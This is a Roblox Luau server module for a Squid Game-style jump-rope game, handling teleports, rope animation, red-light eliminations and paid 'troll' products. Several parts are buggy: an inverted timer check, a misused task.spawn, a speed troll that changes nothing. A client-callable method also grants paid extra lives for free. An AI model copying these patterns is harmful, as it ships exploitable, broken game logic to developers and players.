local collider = workspace.Maps.EasyRopemap:WaitForChild(""HitRope"").PrimaryPart --refrence to the collider (I made it because I am animating rope in client for smooth animation but it wasn't interacting with player properly like hitting so I made an invisible collider which runs on server while synced with client one and it hits the player properly because physics work properly on server sided parts) for the easy rope map
local collider2 = workspace.Maps.HadRopeMap:WaitForChild(""HitRope"").PrimaryPart

local SquidGameMusic = SoundService:FindFirstChild(""Music"") --refrence to the music which runs whenever rope starts spinning and stops whenever rop animation stops
local BackgroundMusic = SoundService:FindFirstChild(""LobbyMusic"") --refrence to the music which runs when players are in lobby and no round is on going yet


--Tables to keep track of certain actions
local PlayerInEasyRopeGame = {}
local PlayerInHardRopeGame = {}
local teleportedPlayers = {}
local HardTeleportedPlayers = {}


--I am storing developerProducts ids in a table to make it easily accessible
local Products = {
	EliminatePlayers = 3312415657, 
	SpeedTroll = 3312416017,
	KillRandomPersonTroll = 3312444642,
	TakeCoinsTroll = 3312417586,
}

--these are also developerProducts but for a pushTool
local PushProducts = {
	Push1 = 3313283431, 
	Push2 = 3313283430,
	Push5 = 3313283433,
	Push7 = 3313283424,
	Push10 = 3313286623,
}

--variables to keep track of certain actions
local ShouldAnimateDoll = false
local ShouldAnimateRopeLight = false

local IsRopeGreenLight

local EasyRopeAnimationConnection = nil
local HardRopeAnimationConnection = nil

local initialCFrameEasyRope = collider.CFrame
local initialCFrameHardRope = collider2.CFrame

--it Handles post-round teleport and cleanup everything like tables, connections etc
function MapHandlerService:handlePostRoundPlayers(lobbyTeleportPoints, animationConnection, teleportedTable, mode)
	for _, player in ipairs(game.Players:GetPlayers()) do --loop to loop through all players
		local selectedMode = player:FindFirstChild(""PlayerSelectedMode"") --returns the player selected round mode (it can be Easy OR Hard)
		if not selectedMode or selectedMode.Value ~= mode then continue end

		local char = player.Character --getting player character so I can teleport it to the looby
		if not char then continue end --skips this loop if player character does not exist

		local humanoid = char:FindFirstChildOfClass(""Humanoid"") --getting humanoid of player character
		if humanoid and humanoid.Health <= 0 then continue end --if player is death then it will not teleport it to lobby and skips the loop

		self.Client.SquidMusic:Fire(player, ""Stop"") --it stops playing the squid music which players whenever rope starts spinning

		local center = lobbyTeleportPoints:FindFirstChild(""Center"") --getting a part named ""Center"" which I placed in lobby so I can check player distance from the lobby
		if not center then continue end

		if (char.PrimaryPart.Position - center.Position).Magnitude > 130 then --it make sure that player is not already in the lobby before teleporting by checking player distance from the center of the lobby
			local allPoints = lobbyTeleportPoints:GetChildren()
			char:PivotTo(allPoints[math.random(1, #allPoints)].CFrame) --it teleports player to the random lobby teleport point
		end
	end

	--Disconnect animation connection and clear teleported data
	if animationConnection then animationConnection:Disconnect() end
	if teleportedTable then table.clear(teleportedTable) end
end


--Function to handle all logics which are neccessory to execute when rope game ends
function MapHandlerService:EndRopeGame(mode)
	local isEasy = (mode == ""Easy"") --boolen value returns true if mode is Easy and false if mode is Hard

	-- Reseting rope by assigning initial CFrame (the CFrame which rope had before it starting spinning) to the rope
	if isEasy then
		collider.CFrame = initialCFrameEasyRope
	else
		ShouldAnimateRopeLight = false
		collider2.CFrame = initialCFrameHardRope
	end

	-- Stop background music
	SquidGameMusic:Stop()

	-- Notify players in mode
	for _, player in ipairs(game.Players:GetPlayers()) do
		local selectedMode = player:FindFirstChild(""PlayerSelectedMode"") --getting player selected mode e.g easy or hard
		if not selectedMode or selectedMode.Value ~= mode then continue end
		self.Client.RoundEnd:Fire(player, mode) --Ends the round from the client side (like stopping rope animation from the client, clearing specific tables, connections etc)
	end

	local success, err = pcall(function()
		if isEasy then
			self:handlePostRoundPlayers(workspace.Maps.EasyLobby.TeleportPoints, EasyRopeAnimationConnection, teleportedPlayers, mode) --telepoprting all players back to the easy map lobby
		else
			self:handlePostRoundPlayers(workspace.Maps.HardLobby.TeleportPoints, HardRopeAnimationConnection, HardTeleportedPlayers, mode) --telepoprting all players back to hard map lobby
		end
	end)

	if not success then
		warn(""[EndRopeGame Error -"", mode, ""]:"", err) --it log error to output if error occurs since I am using pcal which caches the error but prevent script from breaking due to error so I am printing it to console so I able to know if there was any error in pcal and I will able to fix it
	end
end


--returns the number of players that are in easy or hard mode
function MapHandlerService:PlayersInMode(mode)
	local count = 0 --setting intial count as 0
	for _, player in pairs(game.Players:GetPlayers()) do
		if player:FindFirstChild(""PlayerSelectedMode"") and player.PlayerSelectedMode.Value == mode then
			count += 1 -- and then increasing it by 1 by each player that is in the specific mode
		end
	end
	return count --and then returning the count at the end
end


--function to teleport player inside the train track (starting of a round), I call this function when game starts and it teleports players to the train track of the map from where round starts it selectes track depending on the selected mode
function MapHandlerService:TeleportPlayerToTheMap(mapName)
	local map = Maps:FindFirstChild(mapName) --getting map by mapName parametor
	if not map then
		warn(""No map found with the name: "" .. tostring(mapName)) --logs the error to output if map is not found
		return --stops the execution of the function if map is not found
	end

	local isEasy = mapName == ""EasyRopemap"" --it is a boolen value which gets false if map name is HardRopeMap or other and true if it is EasyRopemap
	local isHard = mapName == ""HadRopeMap"" --it is a boolen value which gets false if map name is EasyRopemap or other and true if it is HardRopeMap

	if not isEasy and not isHard then
		warn(""Unsupported map name for rope teleport:"", mapName) --logs the error if both are false (e.g mapName is neither EasyRopemap nor HadRopeMap)
		return
	end

	local playerList = isEasy and PlayerInEasyRopeGame or PlayerInHardRopeGame --it assigns playerlist to PlayerInEasyRopeGame if isEasy is true otherwise it assigns playerList variable to PlayerInHardRopeGame table if isEasy is false
	local startPoints = map:FindFirstChild(""StartPoints"") --refrence to the points where players will be teleported when round beigns

	if not startPoints or #startPoints:GetChildren() == 0 then
		warn(""No StartPoints found in map:"", mapName) --if there is no startPoints then it stops the execution of function and logs the error to output
		return
	end

	for _, player in ipairs(game.Players:GetPlayers()) do
		local selectedMode = player:FindFirstChild(""PlayerSelectedMode"")
		if not selectedMode then continue end

		if (isEasy and selectedMode.Value ~= ""Easy"") or (isHard and selectedMode.Value ~= ""Hard"") then
			continue --it skips the loop if the map for which the loop is running is easy but player is in hard and same for the hard map where it stops if player is in easy mode while function is called with the name of hard map
		end

		local character = player.Character --refrence to the player character
		if not character then continue end --skips the loop if player character is not found

		local randomPoint = startPoints:GetChildren()[math.random(1, #startPoints:GetChildren())] --it gets the random part from a startPoints folder, it first get's all child of the startpoints folder using GetChildren() in-built function which actually returns a table then I am getting random index using math.random and in math.random I am putting minimum value to be 1 and maximum value to be number of instancs that folder have so it should never select that number which is not in the table
		if not randomPoint then continue end --if due to any reason randompoint is not found it skips this specific loop only

		--Teleports and track players
		character:PivotTo(randomPoint.CFrame)
		table.insert(playerList, player)

		--it handles on-death removal from the table
		local humanoid = character:FindFirstChildOfClass(""Humanoid"")
		if not humanoid then return end
		humanoid.Died:Connect(function() --Event that runs whenever player dies, I am using it to clear the player from the table which tracks current players in game whenever he dies because he will be no longer in game
			local index = table.find(playerList, player) --getting the index where the player is 
			if not index then return end --if player is not in playerList table then it stops the execution of the died event
			table.remove(playerList, index) --if player is found in playerList then it removes the player from the playerList table so the player is not anymore in the table which tracks only players that are currently in playing round
		end)
	end
end


--Function to teleport players to the map
function MapHandlerService:TeleportPlayerToInGame(mode)
	local mapName = (mode == ""Easy"") and ""EasyRopemap"" or ""HadRopeMap""
	local map = Maps:FindFirstChild(mapName)
	if not map then
		warn(""[TeleportPlayerToInGame] Map not found for mode:"", mode) --if no map found with the name ""mapName"" then it logs warning to the console
		return
	end

	local teleportPoints = map:FindFirstChild(""InGameTeleport"") --refrence to the teleportPoints foler, it includes multiple parts placed at different positions so all players don's get spawned on the same spot
	if not teleportPoints then
		warn(""[TeleportPlayerToInGame] No InGameTeleport folder found in map:"", mapName) --if unable to find teleport points folder then it logs warning to the console
		return
	end

	local points = teleportPoints:GetChildren() --if teleportPoints folder exist then it is getting all child of that teleportPoints folder
	if #points == 0 then
		warn(""[TeleportPlayerToInGame] No teleport points found for mode:"", mode) --if there is no child/points to teleport player in the teleportPoints folder then it logs warning to the console
		return --stops the execution of the function
	end

	local isEasy = (mode == ""Easy"") --it is a boolen value which gets true if mode is equal to ""Easy"" otherwise it get's false
	local teleportedList = isEasy and teleportedPlayers or HardTeleportedPlayers --it assigns teleportedPlayers table to teleportedList variable if isEasy is true otherwise it assigns playerList variable to HardTeleportedPlayers table
	local playerModeCheck = isEasy and ""Easy"" or ""Hard"" --it assigns the string ""Easy"" to playerModeCheck variable if isEasy is true otherwise it assigns the string ""Hard"" to playerModeCheck variable
	local playerModeCount = isEasy and self:PlayersInMode(""Easy"") or self:PlayersInMode(""Hard"") --gets the number of players who have selected specific mode

	-- Get players not yet teleported
	local unteleportedPlayers = {}
	for _, player in ipairs(game.Players:GetPlayers()) do
		local selectedMode = player:FindFirstChild(""PlayerSelectedMode"")
		if not selectedMode or selectedMode.Value ~= playerModeCheck or table.find(teleportedList, player) then continue end
		table.insert(unteleportedPlayers, player) --inserting unteleported player to the unteleportedPlayers table
	end

	if #unteleportedPlayers == 0 then
		warn(""[TeleportPlayerToInGame] All players in mode"", mode, ""have already been teleported."")
		return --if all palyer has been teleported then it stops the execution of the function
	end

	-- Shuffle players randomly
	for i = #unteleportedPlayers, 2, -1 do
		local j = math.random(1, i) --getting random value between 1 and i
		unteleportedPlayers[i], unteleportedPlayers[j] = unteleportedPlayers[j], unteleportedPlayers[i] -- Swapong player at index i with a random player at index j to shuffle the list
	end

	-- Calculate how many players still need to be teleported (cannot exceed the number of unteleported players)
	local maxToTeleport = math.clamp(playerModeCount - #teleportedList, 0, #unteleportedPlayers)

	for i = 1, maxToTeleport do --looping through the number of players that should be teleported
		local player = unteleportedPlayers[i] --it gets the next player from the shuffled list

		local character = player.Character --getting the player's character model

		local targetPoint = points[1] --picking the first available teleport point from the map

		if not character or not targetPoint then continue end --skipping the player if character is missing or teleport point doesn't exist

		character:PivotTo(targetPoint.CFrame) --it teleports the character to the selected point

		table.insert(teleportedList, player) -- Track this player as already teleported, to avoid double-teleporting
	end
end


--function to format seconds in 00:00 format
function MapHandlerService:FormatTime(seconds)
	local minutes = math.floor(seconds / 60)
	local secs = seconds % 60

	return string.format(""%02d:%02d"", minutes, secs)
end

--Functiion to increment stat values safely
function MapHandlerService:AddToValue(player, statName, amount)
	local stat = player:FindFirstChild(statName) --getting player stats with the specific name
	if not stat then return end
	stat.Value += amount --increasing player stat value with the amount given as input in parametor
end

--Functiion to increment stat values from leaderstats safely
function MapHandlerService:AddToLeaderstat(player, statName, amount)
	local stats = player:FindFirstChild(""leaderstats"") --getting player leaderstats
	local stat = stats and stats:FindFirstChild(statName) --getting player stat with the specific name
	if not stat then return end --if no stat exists then it stops the function
	stat.Value += amount --increasing player stat value with the amount given as input in parametor
end

--function to send specific player notification on client side
local function notifyPlayer(player, message)
	notificationRemote:FireClient(player, message, { Bad = false })
end


--this is a troll function which elliminates all players
local function eliminateAllPlayers(buyer)
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player == buyer then continue end --this is to prevent that buyer do not get trolled itself
		local humanoid = player.Character:FindFirstChildOfClass(""Humanoid"") --getting player's humanoid
		if not humanoid then return end --if no humanoid exists then it stops the function
		humanoid:TakeDamage(humanoid.MaxHealth) --I am using inbuilt function ""TakeDamage"" to kill player
		notifyPlayer(player, ""You Got Trolled!"") --I am notifing player about the troll that is just happened
	end
end

--this is another troll function which kills random player
local function killRandomPlayer(buyer)
	local players = game.Players:GetPlayers() --getting all players in a table
	if #players <= 1 then return end

	local randomPlayer --variable to keep track of random player that is being selected
	repeat
		randomPlayer = players[math.random(1, #players)] --getting random player from the table
	until randomPlayer and randomPlayer ~= buyer

	local humanoid = randomPlayer.Character:FindFirstChildOfClass(""Humanoid"") --getting player's humanoid
	if not humanoid then return end --if no humanoid exists then it stops the function
	humanoid:TakeDamage(humanoid.MaxHealth) --I am using inbuilt function ""TakeDamage"" to kill player
end

--this is another troll function which increases the speed of all players
local function speedTroll(buyer)
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player == buyer then continue end
		local humanoid = player.Character:FindFirstChildOfClass(""Humanoid"") --getting player's humanoid
		if not humanoid then return end --if no humanoid exists then it stops the function
		notifyPlayer(player, ""You Got Trolled!"") --I am then notifing player about the troll that is just happened
	end
end

--This is another troll using this troller can steal 10, 10 coins from all players
local function stealCoins(buyer)
	local totalTaken = 0 --setting initial collected coins to 0
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player == buyer then continue end --if player is the buyer then it will not take coins from him
		local stats = player:FindFirstChild(""leaderstats"") --getting player's leaderstats
		local coins = stats and stats:FindFirstChild(""Coins"") --then getting coins of the player from leaderstats
		if not coins then return end --skips this loop if player don't have value named Coins inside of his leaderstats
		local amount = math.min(coins.Value, 10) --Geting the minimum value between coins and 10 so if player have more then 10 coins then it will cut 10 coins but if player have less then 10 coins then it will cut the coins that player currently own
		coins.Value -= amount --Decrease the coins of the player
		totalTaken += amount --Plus the taken coins from the player to the TotalTaken coins which actually keeps the track of the taken coins
		notifyPlayer(player, ""Someone Took Your Coins, Happy Troll!"")  --It is to notiy player that he just got trolled
	end

	local buyerStats = buyer:FindFirstChild(""leaderstats"") --getting buyers leaderstats
	local buyerCoins = buyerStats and buyerStats:FindFirstChild(""Coins"") --now getting buyers coins from leaderstats after getting leaderstats
	if not buyerCoins then return end -- if no buyer coins instance exist in leaderstats then it stops the execution of the code
	buyerCoins.Value += totalTaken --giving the coins to the troller that has been taken from all players
end

--this function handles purchasing of developer products
function MapHandlerService:HandleDeveloperProductsFunctioning(buyer, productId)
	--this table include all products and their respecitve functions
	local productActions = {
		--trolling developer products
		[Products.EliminatePlayers] = function() eliminateAllPlayers(buyer) end, --kill all players that are in game
		[Products.KillRandomPersonTroll] = function() killRandomPlayer(buyer) end, --gets random player from the game and kill him
		[Products.SpeedTroll] = function() speedTroll(buyer) end, --increases speed of all players
		[Products.TakeCoinsTroll] = function() stealCoins(buyer) end, --steal 10, 10 coins from all players and give it to the buyer

		-- Push Products
		[PushProducts.Push1]  = function() self:AddToValue(buyer, ""Pushes"", 1) end, --increases player push by 1 which is then used with the push tool to push players
		[PushProducts.Push2]  = function() self:AddToValue(buyer, ""Pushes"", 2) end, --increases player push by 2 which is then used with the push tool to push players
		[PushProducts.Push5]  = function() self:AddToValue(buyer, ""Pushes"", 5) end, --increases player push by 5 which is then used with the push tool to push players
		[PushProducts.Push7]  = function() self:AddToValue(buyer, ""Pushes"", 7) end, --increases player push by 7 which is then used with the push tool to push players
		[PushProducts.Push10] = function() self:AddToValue(buyer, ""Pushes"", 10) end, --increases player push by 10 which is then used with the push tool to push players

		-- Coin Boosts
		[3314212399] = function() self:AddToLeaderstat(buyer, ""Coins"", 50) end, --increases player coins by 50
		[3314212620] = function() self:AddToLeaderstat(buyer, ""Coins"", 100) end, --increases player coins by 100
		[3314213085] = function() self:AddToLeaderstat(buyer, ""Coins"", 300) end, --increases player coins by 300
		[3314213295] = function() self:AddToLeaderstat(buyer, ""Coins"", 500) end, --increases player coins by 500
		[3314214142] = function() self:AddToLeaderstat(buyer, ""Coins"", 1000) end, --increases player coins by 100

		-- Extra Life / Gravity / NameTag
		[3314996213] = function() self:AddToValue(buyer, ""ExtraLifes"", 1) end, --gives player 1 extraLife so if player accidently falls down from the train track it teleports player back to the nearest checkpoint that is on train track
		[3314996574] = function() self:AddToValue(buyer, ""LessGravity"", 1) end, --decreases the gravity for the player which gives him extra benifit
		[3314996930] = function() self.Client.NameTag:Fire(buyer) end,
	}

	local action = productActions[productId] --calling correct function from the product id
	if action then
		local success, err = pcall(action)
		if not success then
			warn(""[ProductHandler Error]:"", err) --if there was any error in the called function then it logs that error the output console
		end
	else
		warn(""[Unhandled Product ID]:"", productId) --if the product id wasn't in that table then it logs this out on the output console
	end
end

--Handles the developerproduct functionality after it is purcahsed
function MapHandlerService:DeveloperProductsHandler()
	MPS.PromptProductPurchaseFinished:Connect(function(userId, productId, isPurchased) --event that runs after developer product prompt has closed, either by closing or by purchasing
		if not isPurchased then return end --making sure player only get benfits if he has actually purchased product and not just opened the prompt and cencelled it
		print(""Purchase processed:"", isPurchased, productId)

		local buyer = game.Players:GetPlayerByUserId(userId)
		if not buyer then return end

		self:HandleDeveloperProductsFunctioning(buyer, productId) --Giving the benifits of purchasing product to the buyer
	end)
end

local function generateRainbowColorSequence(offset, num, wave) --function to generate a ColorSequence based on a phase offset
	local colorKeys = table.create(num + 1)	 -- Create a table with num + 1 color keypoints

	-- Loop to generate RGB values with sine waves for rainbow effect
	for i = 0, num do
		local r = 127 * math.sin(wave * i + offset) + 128 --Red channel
		local g = 127 * math.sin(wave * i + 2 * math.pi / 3 + offset) + 128 --Green channel
		local b = 127 * math.sin(wave * i + 4 * math.pi / 3 + offset) + 128 --Blue channel
		local color = Color3.fromRGB(r, g, b) --combined to Color3
		colorKeys[i + 1] = ColorSequenceKeypoint.new(i / num, color) --add keypoint at position
	end

	return ColorSequence.new(colorKeys) -- Return the full ColorSequence object
end

--function to apply rainbowTweening to the nameTag
function MapHandlerService:applyRainbowTween(label)
	local gradient = label:FindFirstChild(""UIGradient"") -- Try to find the UIGradient object inside the label (it uses for color shifting)

	-- If no gradient exists, warn and stop the function
	if not gradient then
		warn(""No UIGradient found in label"")
		return
	end

	local counter = 0 --counter to track color shift offset over time
	local wave = math.pi / 12 --controls how tightly the color wave is spaced (smaller = smoother curve)
	local num = 15 --number of gradient color steps (more means smoother transition)
	local frames = 0 --frame counter to control update frequency

	-- Continuously update the gradient color each frame
	RunService.Heartbeat:Connect(function()
		if frames % 2 ~= 0 then -- Only update every other frame (updates every 2nd frame) to reduce performance cost
			frames += 1
			return
		end

		--set new rainbow color gradient on each update
		gradient.Color = generateRainbowColorSequence(counter, num, wave)
		counter -= math.pi / 40 --shifts the wave offset slightly to create animated rainbow effect

		if counter >= math.pi * 2 then --reset counter if full cycle (2 pi) is completed to loop smoothly
			counter = 0
		end

		frames = (frames + 1) % 1000 --increment and wrap frame counter (keeps it in a reasonable range)
	end)
end

--fuction to handle gamepasses, currently it's handeling only 1 which is rainbow nametag
function MapHandlerService:HandleGamepasses()
	MPS.PromptGamePassPurchaseFinished:Connect(function(UserId, ganmepassId, IsPurchased) --event that runs after gamepass prompt has closed, either by closing or by purchasing
		if not IsPurchased then return end --making sure player only get benfits if he has actually purchased gamepass and not just opened the prompt and cencelled it
		local player = game.Players:GetPlayerByUserId(UserId) --getting the buyer using userId
		if ganmepassId == 1274510513 then --condition to check if the id of gamepass which he purchased mathces with the rainbow name tag gamepass id or not
			local NameTag = ReplicatedStorage.Assets:FindFirstChild(""nametagui"") --getting rainbow name tag from replicatedStorage
			if not NameTag then return end --if no nameTag found then it stops the execution of the event

			local PreviousNameTag = player.Character:FindFirstChild(""Head""):FindFirstChild(NameTag.Name) --get's the name tag if player already have one

			if PreviousNameTag then --if player already have name tag then it deletes it because it will probably be a simple one and not rainbow
				PreviousNameTag:Destroy() --using destroy to remove nametag 
			end

			local CloneNameTag = NameTag:Clone() --making a copy of the name tag that is in replicatedStorage
			CloneNameTag.Parent = player.Character:FindFirstChild(""Head"") --placing nametag to player's head
			CloneNameTag.ntframe.username.Text = player.Name --adding player's name to the usertanem text of nametag

			self:applyRainbowTween(CloneNameTag.ntframe.username) --finally applying the rainbow effect to the name tag
		end
	end)
end

--function the kill the player if walking, it excludes those players whose only jumping by getting only veloctiy of the x and z compnents and leaving the y one
function MapHandlerService:KillIfWalking(player: Player)
	local character = player.Character --getting player's character
	if not character then return end --stops the function if no character is found

	local humanoid = character:FindFirstChildOfClass(""Humanoid"") --getting player's humanoid
	local hrp = character:FindFirstChild(""HumanoidRootPart"") -- getting player's humanoidRootPart

	if not humanoid or not hrp or humanoid.Health <= 0 then -- if there is no humanoid or humanoidrootpart or player is died then it ignores that player by stopping the execution of function
		return
	end

	if IsRopeGreenLight then return end --if light is green then it do not kill the player and player can move freely

	local velocity = hrp.AssemblyLinearVelocity --getting player's humanoidRootPart velocty
	local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude --converting x and z direction vectors values into scalar (magnitude) and ignore y component because I don't want players jump to be count as velocity

	local HORIZONTAL_SPEED_THRESHOLD = 3 --this is the speed limit in which player needs to be to prevent from getting killed

	if horizontalSpeed <= HORIZONTAL_SPEED_THRESHOLD then
		return --stops the function if player speed is equal to or less then 3
	else
		humanoid.Health = 0 --and if it is more then 3 then it kills the player
	end
end

--function to update the light state whether to green or red
function MapHandlerService:updateLightState(isGreen, redLight, greenLight)
	if isGreen then
		redLight.Material = Enum.Material.SmoothPlastic --changes the material of the light to smoothplastic to give it turned off look
		redLight.Color = Color3.new(0, 0, 0) --changes the color of the light to black to give it turned off look
		greenLight.Material = Enum.Material.Neon --changes the greenlight material of the light to neon to give it turned ON look
		greenLight.Color = Color3.new(0, 1, 0) --changes the greenlight color of the light to green
		GreenLightSound:Play() --plays the sound which says ""Green light""
	else
		redLight.Material = Enum.Material.Neon  --changes the redLight material of the light to neon to give it turned ON look
		redLight.Color = Color3.new(1, 0, 0) --changes the redLight color of the light to Red
		greenLight.Material = Enum.Material.SmoothPlastic --changes the material of the light to smoothplastic to give it turned off look
		greenLight.Color = Color3.new(0, 0, 0) --changes the color of the light to black to give it turned off look
		RedlightSound:Play()  --plays the sound which says ""Red light""
	end
end

--Handles the turning of light to green and red
function MapHandlerService:AnimateLights()
	local redLight = workspace.Maps.HadRopeMap.Light.RedLight.Part --refrence to the redlight
	local greenLight = workspace.Maps.HadRopeMap.Light.GreenLight.Part --refrence to the greenlight

	ShouldAnimateRopeLight = true
	IsRopeGreenLight = true

	--it Starts the light cycle
	task.spawn(function()
		self:updateLightState(true, redLight, greenLight) --turns greenlight ON and turn the redlight OFF

		wait(2)

		while ShouldAnimateRopeLight do
			warn(""Light loop running"")
			wait(math.random(4, 7))

			if not ShouldAnimateRopeLight then break end

			IsRopeGreenLight = not IsRopeGreenLight
			self:updateLightState(IsRopeGreenLight, redLight, greenLight) --turns light to red if green and to green if red
		end

		-- Reset lights to default (off) state
		redLight.Material = Enum.Material.SmoothPlastic
		redLight.Color = Color3.new(0, 0, 0)
		greenLight.Material = Enum.Material.SmoothPlastic
		greenLight.Color = Color3.new(0, 0, 0)
	end)
end


-- Helper: Start Rope Rotation Animation
function MapHandlerService:StartRopeAnimation(mode, collider, initialCFrame)
	local accelTime = 3  --defining duration (in seconds) for the rope to accelerate up to full speed

	local maxSpeed = math.rad(mode == ""Easy"" and 250 or 210) --Setting max rotation speed (in radians per second), different for Easy/Hard mode

	--connecting to Heartbeat to animate rope rotation every frame
	local animationConnection = RunService.Heartbeat:Connect(function()
		local rotation
		local t = math.clamp(workspace:GetServerTimeNow(), 0, accelTime) --time since animation started, clamped to acceleration time

		--calculate rope rotation angle based on acceleration curve
		if t < accelTime then
			rotation = 0.33 * maxSpeed * (t / accelTime) ^ 3 * accelTime --accelerating phase: use cubic easing for smooth buildup
		else
			rotation = 0.33 * maxSpeed * accelTime + maxSpeed * (t - accelTime) --constant speed phase after reaching full acceleration
		end

		collider.CFrame = initialCFrame * CFrame.Angles(rotation, 0, 0) --applying rotation to rope's collider relative to its initial position

		-- In Hard mode, check if players are walking during red light if they are then eliminate them
		if mode == ""Hard"" then
			for _, player in pairs(PlayerInHardRopeGame) do
				self:KillIfWalking(player)
			end
		end
	end)

	-- Store the connection reference for later cleanup (e.g disconnecting on round end)
	if mode == ""Easy"" then
		self.EasyRopeAnimationConnection = animationConnection
	else
		self.HardRopeAnimationConnection = animationConnection
	end
end

--countdown timer which counts the time for the round and ends the round when timer reaches 0
function MapHandlerService:CountDown(mode, playerList, map)
	for i = 120, 0, -1 do
		wait(1)
		local timerLabel = map.Timer.Part.SurfaceGui:FindFirstChild(""TextLabel"") --refrence to the textlabel to display the timer

		if timerLabel then continue end --if no timer label founds then it skips this loop
		timerLabel.Text = self:FormatTime(i) --format the time into 00:00 formate before displaying it on the textlabel

		if #playerList == 0 then --if all players are eliminated then stop the timer immediately
			break
		end
	end

	self:EndRopeGame(mode) --logic to handle ending of the round like clearing the tables, connections etc
	table.clear(playerList) --clearing the playerList table on round end
end

-- Starts Countdown
function MapHandlerService:StartRopeCountdown(mode, playerList)
	local mapName = (mode == ""Easy"") and ""EasyRopemap"" or ""HadRopeMap"" --if mode is equal to ""Easy"" then makes mapNam equal to EasyRopemap otherwise it makes mapName variable equal to ""HadRopeMap""
	local map = Maps[mapName] --getting map from the mapName
	if not map then
		warn(""[StartRopeCountdown] Map not found for mode:"", mode) --if no map found with that name then it logs error to the output and stops the function
		return
	end

	task.spawn(self:CountDown(mode, playerList, map)) --starts countdown, I am using task.spawm for it so it don't disturb rest of the script
end

--Binding Event Connections
function MapHandlerService:BindRopeTouchedEvents(mode, playerList)
	local map = Maps[mode == ""Easy"" and ""EasyRopemap"" or ""HadRopeMap""] --getting the map with the name EasyRopemap is mode is ""Easy"" otherwise getting map with the name HadRopeMap

	local finishConn
	finishConn = map.FinishPoint.Touched:Connect(function(hit) --event that runs whenever player bodyPart touches specific part, in this case it runs whenever player touches finishline and then it rewards the player with win and coins
		local player = game.Players:GetPlayerFromCharacter(hit.Parent) or game.Players:GetPlayerFromCharacter(hit.Parent.Parent) --I am getting player from the player character and if player body part like head, righthand, lefthand etc toched the part that it can get the character directly from hit.Parent but if handle of the accessory player wearing has touched the part then it will not able to get character from character.Parent since it's not inside character but inside character.Accessory so in that case next line will get the character using character.Parent.Parent
		if not player or not table.find(playerList, player) then return end --if no player found or player is not inside playerlist table then it stops the execution of event
		table.remove(playerList, table.find(playerList, player)) --if player is in playerList table then it will remove the player from the that table
		local stats = player:WaitForChild(""leaderstats"") --getting leaderstats of player
		stats:WaitForChild(""Wins"").Value += 1 --increases player win by 1
		stats:WaitForChild(""Coins"").Value += 50	--increases player coins by 50
		if #playerList ~= 0 then return end	 --if there is players inside playerList table then it stops the function and do not runs below lines, below lines ends the game and we don't want game to get end before time if there are players playing in the round
		self:EndRopeGame(mode) --function to end the rope game round and it clears all tables and connections that needed to clear
		table.clear(playerList) --clears the playerList table just in case if anything leftover
		finishConn:Disconnect() --disconnecting the finishpoint touche event so it won't run when anyone touch when round is over plus when next time round starts the previous connected event won't overlap with the new one
	end)
	
	--it stops player from going back if player has reached the finish area
	map.BlockGoingBack.Touched:Connect(function(hit)
		local player = game.Players:GetPlayerFromCharacter(hit.Parent) or game.Players:GetPlayerFromCharacter(hit.Parent.Parent) 
		if not player then return end
		self.Client.BlockGoingBack:Fire(player, mode) --fires client to make going back block collideable so it only get collideable for that player and still players who haven't reached ending yet will able to cross that part and reach finish line
	end)
end


--Handling the entire RopeMap round functionality
function MapHandlerService:RopeMap(mode)
	local isEasy = (mode == ""Easy"") --it is a boolen value which gets true if mode is equal to ""Easy"" otherwise it get's false
	local mapName = isEasy and ""EasyRopemap"" or ""HadRopeMap"" --if isEasy is true then it make mapName equal to ""EasyRopemap"" else it makes mapName equal to ""HadRopeMap""
	local playerList = isEasy and PlayerInEasyRopeGame or PlayerInHardRopeGame --same logic with this line
	local colliderRef = isEasy and collider or collider2 --and same logic with this
	local initialCFrameRef = isEasy and initialCFrameEasyRope or initialCFrameHardRope
	local animationConnectionRef = isEasy and ""EasyRopeAnimationConnection"" or ""HardRopeAnimationConnection""

	--teleport players and prepare map
	self:TeleportPlayerToTheMap(mapName)
	wait(8)
	--teleports player to the train track from where the actual round starts
	self:TeleportPlayerToInGame(mode)

	--start Music
	for _, player in pairs(playerList) do
		self.Client.SquidMusic:Fire(player, ""Play"")
	end

	--handles early Exit if all players get eliminated
	task.spawn(function()
		while wait(1) do
			if #playerList ~= 0 then return end
			wait(5)
			table.clear(playerList)
			self:EndRopeGame(mode) --Ends the round of rope map and clears all table and connections that are needd to
			break --stops the loop
		end
	end)

	--calling function to animate Rope
	self:StartRopeAnimation(mode, colliderRef, initialCFrameRef, animationConnectionRef)

	--playing rope animation on the client too and syncing it with the server and making sure it starts at the same time for all players
	for _, player in pairs(playerList) do
		self.Client.AnimateRopes:Fire(player, workspace:GetServerTimeNow() + 3, mode)
	end

	--animating Lights (only if it's hard mode)
	if not isEasy then
		self:AnimateLights()
	end

	--start Countdown Timer
	self:StartRopeCountdown(mode, playerList)

	--Connects Rope touch events
	self:BindRopeTouchedEvents(mode, playerList)
end

--fucntion to give player extra lifes/if player have extra lifes and accidently get fall down from the train track then it get teleported back to the train track to the closest checkpoint
function MapHandlerService.Client:ExtraLifes(player:Player)
	local ExtraLifes = player:FindFirstChild(""ExtraLifes"") --getting ExtraLifes instance from the player
	if not ExtraLifes then return end --if no ExtraLifes named instance found in player then it stops the execution of function
	ExtraLifes.Value += 1 --if extralifes found then it increases the extraLifes of player by 1
end

--gives player nametag
function MapHandlerService.Client:GiveNameTags(player:Player, TextColor)
	local NameTag = ReplicatedStorage.Assets:FindFirstChild(""nametagui"") --getting nametag from the replicatedStorage
	if not NameTag then return end --if there is no nametag then it stops the execution of the function
	local PreviousNameTag = player.Character:FindFirstChild(""Head""):FindFirstChild(NameTag.Name) --tries to find previous nameTag

	if PreviousNameTag then --if player already have nametag then it deletes it
		PreviousNameTag:Destroy() --uses inbuilt function Destory() to delete previous nametag
	end

	local CloneNameTag = NameTag:Clone() --Copies name tag from the replicatedStorage
	CloneNameTag.Parent = player.Character:FindFirstChild(""Head"") --set parent of new name tag to the player's head
	CloneNameTag.ntframe.username.Text = player.Name --sets nametag text to the username of player
	CloneNameTag.ntframe.username.UIGradient.Enabled = false --disables UIGradient of nametag
	CloneNameTag.ntframe.username.TextColor3 = TextColor --sets the textcolor of the playerName to the name player has selected using color wheel UI
end

--increases or decreases lessgravity value of player depending on argument
function MapHandlerService.Client:LessGravity(player:Player, argument)
	if argument == ""IncreaseGravityValue"" then
